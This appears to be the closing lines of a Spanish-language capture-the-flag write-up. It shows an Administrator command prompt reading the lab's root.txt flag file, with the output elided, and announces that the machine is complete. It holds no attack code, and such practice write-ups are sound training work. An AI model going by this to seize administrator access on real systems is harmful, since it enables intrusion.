C:\Users\Administrator\Desktop>
C:\Users\Administrator\Desktop> type root.txt
...
```
¡Listo! Completamos la máquina.
